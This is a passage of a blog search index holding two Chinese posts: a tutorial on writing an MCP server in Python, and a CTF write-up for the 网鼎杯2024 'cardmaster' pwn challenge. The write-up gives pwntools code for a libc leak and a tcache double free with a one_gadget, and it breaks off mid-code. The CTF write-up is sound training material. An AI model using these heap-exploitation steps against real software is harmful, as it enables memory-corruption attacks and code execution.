<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>安全开发-mcp-learn-1</title>
      <link href="/2025/03/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-mcp-learn-1/"/>
      <url>/2025/03/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-mcp-learn-1/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是MCP"><a href="#什么是MCP" class="headerlink" title="什么是MCP"></a>什么是MCP</h2><p>MCP 起源于 2024 年 11 月 25 日 Anthropic发布的文章：<a href="https://www.anthropic.com/news/model-context-protocol">Introducing the Model Context Protocol</a>。</p><p>MCP （Model Context Protocol，模型上下文协议）定义了应用程序和 AI 模型之间交换上下文信息的方式。这使得开发者能够<strong>以一致的方式将各种数据源、工具和功能连接到 AI 模型</strong>（一个中间协议层），就像 USB-C 让不同设备能够通过相同的接口连接一样。MCP 的目标是创建一个通用标准，使 AI 应用程序的开发和集成变得更加简单和统一。</p><p><strong>想象一下没有 MCP 之前我们会怎么做</strong>？我们可能会人工从数据库中筛选或者使用工具检索可能需要的信息，手动的粘贴到 prompt 中。随着我们要解决的问题越来越复杂，<strong>手工</strong>把信息引入到 prompt 中会变得越来越困难。</p><p>为了克服手工 prompt 的局限性，许多 LLM 平台（如 OpenAI、Google）引入了 <code>function call</code> 功能。这一机制允许模型在需要时调用预定义的函数来获取数据或执行操作，显著提升了自动化水平。</p><h2 id="MCP的结构"><a href="#MCP的结构" class="headerlink" title="MCP的结构"></a>MCP的结构</h2><ul><li><strong>MCP Hosts</strong>: 像 Claude Desktop、IDEs 或 AI 工具这样的程序，它们希望通过 MCP 访问资源</li><li><strong>MCP Clients</strong>: 维护与服务器 1:1 连接的协议客户端</li><li><strong>MCP Servers</strong>: 轻量级程序，通过标准化的 Model Context Protocol 暴露特定功能</li><li><strong>Local Resources</strong>: 你的计算机资源（数据库、文件、服务），MCP 服务器可以安全地访问这些资源</li><li><strong>Remote Resources</strong>: 通过互联网可用的资源（例如，通过 APIs），MCP 服务器可以连接到这些资源</li></ul><h2 id="创建MCP-Server"><a href="#创建MCP-Server" class="headerlink" title="创建MCP Server"></a>创建MCP Server</h2><p>使用uv创建应该环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uvx create-mcp-server --path 路径</span><br></pre></td></tr></table></figure><p>然后按照它的提示一步步创建即可，并添加对它的依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uv add httpx python-dotenv</span><br></pre></td></tr></table></figure><h2 id="编写MCP"><a href="#编写MCP" class="headerlink" title="编写MCP"></a>编写MCP</h2><p>进入项目的src&#x2F;项目同名文件夹，可以看到有以下创建好的两个python文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----         2025/3/11     19:15           5076 server.py</span><br><span class="line">-a----         2025/3/11     19:15            220 __init__.py</span><br></pre></td></tr></table></figure><p>其中我们进去会发现它已经为我们写好一个可以使用的例子了，但是我们还是需要了解其中内容的结构的。</p><p>首先是server部分，这是mcp能实现功能的关键部分</p><h3 id="资源部分"><a href="#资源部分" class="headerlink" title="资源部分"></a>资源部分</h3><p>当你想让ai访问本地&#x2F;线上资源的时候，ai怎么知道有哪些资源可以访问？又该如何阅读？资源部分就是为了解决这个问题而诞生的，我们只需要为ai声明阅读的uri并实现阅读的方法，就能进行资源使用。</p><h4 id="资源声明结构"><a href="#资源声明结构" class="headerlink" title="资源声明结构"></a>资源声明结构</h4><p>这是资源声明的格式</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">uri</span>: <span class="built_in">string</span>;           <span class="comment">// 资源的唯一标识符</span></span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;          <span class="comment">// 人类可读的名称</span></span><br><span class="line">  description?: <span class="built_in">string</span>;  <span class="comment">// 可选描述</span></span><br><span class="line">  mimeType?: <span class="built_in">string</span>;     <span class="comment">// 可选 MIME 类型</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">uriTemplate</span>: <span class="built_in">string</span>;   <span class="comment">// 遵循 RFC 6570 的 URI 模板</span></span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;          <span class="comment">// 此类型的人类可读名称</span></span><br><span class="line">  description?: <span class="built_in">string</span>;  <span class="comment">// 可选描述</span></span><br><span class="line">  mimeType?: <span class="built_in">string</span>;     <span class="comment">// 所有匹配资源的可选 MIME 类型</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>格式的 URI 进行标识：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[protocol]://[host]/[path]</span><br></pre></td></tr></table></figure><p>例如：</p><ul><li><code>file:///home/user/documents/report.pdf</code></li><li><code>postgres://database/customers/schema</code></li><li><code>screen://localhost/display1</code>(获取屏幕信息)</li></ul><p>创建资源标识可以使得资源被ai发现阅览，而这一过程通过以下两个函数传递</p><h4 id="list-resources"><a href="#list-resources" class="headerlink" title="list_resources()"></a>list_resources()</h4><p>这个函数的作用是将资源以列表的列表传递给大模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.list_resources()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">list_resources</span>() -&gt; <span class="built_in">list</span>[types.Resource]:</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="comment"># 直接资源，这里给出的uri是确定的，ai只需要对uri进行选择</span></span><br><span class="line">        types.Resource(</span><br><span class="line">            uri=<span class="string">&quot;uri路径&quot;</span>,</span><br><span class="line">            name=<span class="string">&quot;资源名称&quot;</span>,</span><br><span class="line">            mimeType=<span class="string">&quot;资源类型&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 资源模板，这里的uri是ai根据RFC 6570 的 URI 模板进行自动输入，详情 https://rfc2cn.com/rfc6570.html</span></span><br><span class="line">        types.Resource(</span><br><span class="line">            uriTemplate=<span class="string">&quot;uri路径&quot;</span>,</span><br><span class="line">            name=<span class="string">&quot;资源名称&quot;</span>,</span><br><span class="line">            mimeType=<span class="string">&quot;资源类型&quot;</span></span><br><span class="line">        )</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><h4 id="read-resource"><a href="#read-resource" class="headerlink" title="read_resource()"></a>read_resource()</h4><p>处理并阅读其中的资源，将其以自定义的形式返回的大模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.read_resource()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">read_resource</span>(<span class="params">uri: AnyUrl</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment"># 根据ai要访问的资源路径进行处理，这里的uri则是由ai生成</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(uri) == <span class="string">&quot;file:///logs/app.log&quot;</span>:   <span class="comment"># 此处根据上面资源文件或是资源模板的uri进行判断来选择执行不同的资源处理</span></span><br><span class="line">        log_contents = <span class="keyword">await</span> read_log_file() <span class="comment"># 任意函数处理文件，最终以string的格式返回给ai</span></span><br><span class="line">        <span class="keyword">return</span> log_contents</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;资源未找到&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="工具部分"><a href="#工具部分" class="headerlink" title="工具部分"></a>工具部分</h3><h4 id="工具结构"><a href="#工具结构" class="headerlink" title="工具结构"></a>工具结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  name: string;          // 工具的唯一标识符</span><br><span class="line">  description?: string;  // 人类可读的描述</span><br><span class="line">  inputSchema: &#123;         // 工具参数的 JSON Schema</span><br><span class="line">    type: &quot;object&quot;,</span><br><span class="line">    properties: &#123; ... &#125;  // 工具特定的参数</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="list-tools实现工具列表"><a href="#list-tools实现工具列表" class="headerlink" title="list_tools实现工具列表"></a>list_tools实现工具列表</h4><p>这个函数的作用是告诉ai可以使用的工具</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@server.list_tools()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_list_tools</span>() -&gt; <span class="built_in">list</span>[types.Tool]:</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        types.Tool(</span><br><span class="line">            name=<span class="string">&quot;工具函数名&quot;</span>,</span><br><span class="line">            description=<span class="string">&quot;工具的描述&quot;</span>,</span><br><span class="line">            inputSchema=&#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;object&quot;</span>,</span><br><span class="line">                <span class="string">&quot;properties&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;变量名1&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;description&quot;</span>:<span class="string">&quot;变量信息描述&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;变量名2&quot;</span>: &#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>&#125;,</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;required&quot;</span>: [<span class="string">&quot;变量名1&quot;</span>, <span class="string">&quot;变量名2&quot;</span>],</span><br><span class="line">            &#125;,</span><br><span class="line">        )</span><br><span class="line">    ]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="handle-call-tool"><a href="#handle-call-tool" class="headerlink" title="handle_call_tool"></a>handle_call_tool</h4><p>这个函数将根据ai的返回进行分析处理并返回给ai</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@server.call_tool()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_call_tool</span>(<span class="params"></span></span><br><span class="line"><span class="params">    name: <span class="built_in">str</span>, arguments: <span class="built_in">dict</span> | <span class="literal">None</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">list</span>[types.TextContent | types.ImageContent | types.EmbeddedResource]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Handle tool execution requests.</span></span><br><span class="line"><span class="string">    Tools can modify server state and notify clients of changes.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">&quot;函数名&quot;</span>: <span class="comment">#判断当前ai调用的函数</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unknown tool: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> arguments:<span class="comment">#判断是否输入进参数（参数以dict的格式传入）</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Missing arguments&quot;</span>)</span><br><span class="line"></span><br><span class="line">    变量名<span class="number">1</span> = arguments.get(<span class="string">&quot;变量名1&quot;</span>)</span><br><span class="line">    变量名<span class="number">2</span> = arguments.get(<span class="string">&quot;变量名2&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 可以添加调用其他的处理函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        types.TextContent(</span><br><span class="line">            <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span>,</span><br><span class="line">            text=<span class="string">f&quot;返回给ai的内容&quot;</span>,</span><br><span class="line">        )</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><h3 id="提示部分"><a href="#提示部分" class="headerlink" title="提示部分"></a>提示部分</h3><p>我们给了大模型工具的可以访问的资源，但是和人一样，面临很多新的名词可能无法进行理解，如何使用就成了新的问题，提示部分就好比一本说明书，对那些名词进行说明并告知大模型应该怎样进行运行。</p><p>这一过程分为两个部分：</p><ol><li>发现提示</li><li>使用提示</li></ol><h4 id="提示部分结构"><a href="#提示部分结构" class="headerlink" title="提示部分结构"></a>提示部分结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  name: string;              // 提示的唯一标识符</span><br><span class="line">  description?: string;      // 人类可读的描述</span><br><span class="line">  arguments?: [              // 可选的参数列表</span><br><span class="line">    &#123;</span><br><span class="line">      name: string;          // 参数标识符</span><br><span class="line">      description?: string;  // 参数描述</span><br><span class="line">      required?: boolean;    // 参数是否必需</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="定义提示"><a href="#定义提示" class="headerlink" title="定义提示"></a>定义提示</h4><p>那我们如何在python中写这个功能呢？首先需要根据提示结构一个提示的静态变量，用来说明有哪些提示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">PROMPTS = &#123;</span><br><span class="line">    <span class="string">&quot;git-commit&quot;</span>: types.Prompt(</span><br><span class="line">        name=<span class="string">&quot;git-commit&quot;</span>,</span><br><span class="line">        description=<span class="string">&quot;生成 Git 提交消息&quot;</span>,</span><br><span class="line">        arguments=[</span><br><span class="line">            types.PromptArgument(</span><br><span class="line">                name=<span class="string">&quot;changes&quot;</span>,</span><br><span class="line">                description=<span class="string">&quot;Git diff 或更改描述&quot;</span>,</span><br><span class="line">                required=<span class="literal">True</span></span><br><span class="line">            )</span><br><span class="line">        ],</span><br><span class="line">    ),</span><br><span class="line">    <span class="string">&quot;explain-code&quot;</span>: types.Prompt(</span><br><span class="line">        name=<span class="string">&quot;explain-code&quot;</span>,</span><br><span class="line">        description=<span class="string">&quot;解释代码如何工作&quot;</span>,</span><br><span class="line">        arguments=[</span><br><span class="line">            types.PromptArgument(</span><br><span class="line">                name=<span class="string">&quot;code&quot;</span>,</span><br><span class="line">                description=<span class="string">&quot;要解释的代码&quot;</span>,</span><br><span class="line">                required=<span class="literal">True</span></span><br><span class="line">            ),</span><br><span class="line">            types.PromptArgument(</span><br><span class="line">                name=<span class="string">&quot;language&quot;</span>,</span><br><span class="line">                description=<span class="string">&quot;编程语言&quot;</span>,</span><br><span class="line">                required=<span class="literal">False</span></span><br><span class="line">            )</span><br><span class="line">        ],</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="传递提示列表"><a href="#传递提示列表" class="headerlink" title="传递提示列表"></a>传递提示列表</h4><p>生成提示列表则是为了让ai知晓存在那些提示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.list_prompts()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">list_prompts</span>() -&gt; <span class="built_in">list</span>[types.Prompt]:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(PROMPTS.values())</span><br></pre></td></tr></table></figure><p>大模型会对server端进行一次询问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 请求</span><br><span class="line">&#123;</span><br><span class="line">  method: &quot;prompts/list&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时list_prompts则会返回我们的提示信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 响应</span><br><span class="line">&#123;</span><br><span class="line">  prompts: [</span><br><span class="line">    &#123;</span><br><span class="line">      name: &quot;analyze-code&quot;,</span><br><span class="line">      description: &quot;分析代码以寻找潜在的改进&quot;,</span><br><span class="line">      arguments: [</span><br><span class="line">        &#123;</span><br><span class="line">          name: &quot;language&quot;,</span><br><span class="line">          description: &quot;编程语言&quot;,</span><br><span class="line">          required: true</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="get-prompt解析提示"><a href="#get-prompt解析提示" class="headerlink" title="get_prompt解析提示"></a>get_prompt解析提示</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.get_prompt()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">get_prompt</span>(<span class="params"></span></span><br><span class="line"><span class="params">    name: <span class="built_in">str</span>, arguments: <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>] | <span class="literal">None</span> = <span class="literal">None</span></span></span><br><span class="line"><span class="params"></span>) -&gt; types.GetPromptResult:</span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> PROMPTS:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;未找到提示：<span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> name == <span class="string">&quot;提示名&quot;</span>:</span><br><span class="line">        changes = arguments.get(<span class="string">&quot;参数名称&quot;</span>) <span class="keyword">if</span> arguments <span class="keyword">else</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> types.GetPromptResult(</span><br><span class="line">            messages=[</span><br><span class="line">                types.PromptMessage(</span><br><span class="line">                    role=<span class="string">&quot;user&quot;</span>,</span><br><span class="line">                    content=types.TextContent(</span><br><span class="line">                        <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span>, <span class="comment"># 类型</span></span><br><span class="line">                        text=<span class="string">f&quot;为这些更改生成简洁但描述性的提交消息：\n\n<span class="subst">&#123;changes&#125;</span>&quot;</span> <span class="comment"># 返回的信息</span></span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            ]</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;未找到提示实现&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="启动函数"><a href="#启动函数" class="headerlink" title="启动函数"></a>启动函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># Run the server using stdin/stdout streams</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> mcp.server.stdio.stdio_server() <span class="keyword">as</span> (read_stream, write_stream):</span><br><span class="line">        <span class="keyword">await</span> server.run(</span><br><span class="line">            read_stream,</span><br><span class="line">            write_stream,</span><br><span class="line">            InitializationOptions(</span><br><span class="line">                server_name=<span class="string">&quot;项目名称&quot;</span>,</span><br><span class="line">                server_version=<span class="string">&quot;版本&quot;</span>,</span><br><span class="line">                capabilities=server.get_capabilities(</span><br><span class="line">                    notification_options=NotificationOptions(),</span><br><span class="line">                    experimental_capabilities=&#123;&#125;,</span><br><span class="line">                ),</span><br><span class="line">            ),</span><br></pre></td></tr></table></figure><h2 id="放入mcp"><a href="#放入mcp" class="headerlink" title="放入mcp"></a>放入mcp</h2><p>在其设置目录中放入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;mcpServers&quot;: &#123;</span><br><span class="line">        &quot;weather&quot;: &#123;</span><br><span class="line">            &quot;command&quot;: &quot;uv&quot;,</span><br><span class="line">            &quot;args&quot;: [</span><br><span class="line">                &quot;--directory&quot;,</span><br><span class="line">                &quot;项目路径&quot;,</span><br><span class="line">                &quot;run&quot;,</span><br><span class="line">                &quot;项目名称&quot;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞发掘 </tag>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2024——cardmaster</title>
      <link href="/2024/11/29/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E2%80%94%E2%80%94cardmaster/"/>
      <url>/2024/11/29/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E2%80%94%E2%80%94cardmaster/</url>
      
        <content type="html"><![CDATA[<h2 id="cardmaster"><a href="#cardmaster" class="headerlink" title="cardmaster"></a>cardmaster</h2><h3 id="换ld和libc"><a href="#换ld和libc" class="headerlink" title="换ld和libc"></a>换ld和libc</h3><p>此步骤略，但是可以发现是2.27的版本</p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>经过分析得到结构体</p><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce1067c29.png" alt="image-20241129114856377" title="1"></p><p>函数的功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   CARD MASTER&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  1. init card set&quot;</span>); <span class="comment">//利用点</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  2. set info&quot;</span>);<span class="comment">//利用点</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  3. get info&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  4. shuffle!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;  5. show cards&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce10ae6d8.png" alt="image-20241129115329714"></p><p>利用realloc在申请为0时会执行free策略，来进行释放，并且可以double</p><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce10239f7.png" alt="image-20241129115811070"></p><p>show这里没有对堆块进行检查，可以直接打印，有点uaf的感觉</p><h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><h4 id="泄露libc基址"><a href="#泄露libc基址" class="headerlink" title="泄露libc基址"></a>泄露libc基址</h4><p>第一步利用set_info创建一个0x110的大堆块，然后释放掉得到unsort</p><p>这时候还会存在一个tacache bin，然后用init来吧tacache bin清空</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0x110</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">init()</span><br></pre></td></tr></table></figure><p>再次free，由于这时花色是全局变量，所以这里执行malloc0，但是malloc最小为0x20，于是从unsortbin切割，由于init中的malloc已经进行一次切割，所以得到的数据在free新申请的数据里存在，并且位置正好在字符串处，打印获得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;set:&quot;</span>)</span><br><span class="line">base = u64(p.recvuntil(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br></pre></td></tr></table></figure><h4 id="二次释放"><a href="#二次释放" class="headerlink" title="二次释放"></a>二次释放</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc.address = base</span><br><span class="line">one_gadget = <span class="number">0x4f322</span> + base</span><br><span class="line">free()</span><br><span class="line">free()</span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce0fbb164.png" alt="image-20241129121619304"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span 